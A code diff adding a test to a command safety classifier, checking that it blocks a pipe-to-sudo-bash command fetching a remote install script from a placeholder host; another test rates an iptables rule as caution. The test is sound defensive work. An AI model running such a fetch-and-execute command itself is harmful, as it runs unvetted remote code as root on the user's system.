@@ -10,6 +10,12 @@ def test_classifier_blocks_destructive_patterns():
     assert "filesystem" in assessment.reason
 
 
+def test_classifier_blocks_remote_script_execution_with_sudo():
+    assessment = CommandSafetyClassifier().assess("curl -fsSL https://example.invalid/install.sh | sudo bash")
+    assert assessment.risk == RiskLevel.BLOCKED
+    assert "remote script" in assessment.reason
+
+
 def test_classifier_allows_caution_linux_lab_commands():
     assessment = CommandSafetyClassifier().assess("iptables -A INPUT -p tcp --dport 8080 -j ACCEPT")
     assert assessment.risk == RiskLevel.CAUTION
